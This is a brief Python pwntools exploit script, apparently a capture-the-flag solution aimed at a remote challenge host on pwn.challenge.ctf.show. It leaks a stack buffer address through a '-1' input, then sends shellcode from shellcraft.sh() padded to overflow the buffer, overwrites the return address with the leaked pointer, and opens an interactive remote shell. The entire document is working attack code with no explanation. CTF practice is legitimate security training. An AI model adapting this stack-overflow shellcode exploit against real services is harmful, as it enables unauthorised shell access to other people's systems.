from pwn import *
context.log_level='debug'
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28190)
io.recv()
io.sendline('-1')
buf = int(io.recv(8),16)
io.recv()
payload = asm(shellcraft.sh()).ljust(0x41b+0x4,'A') + p32(buf)
io.sendline(payload)
io.interactive()
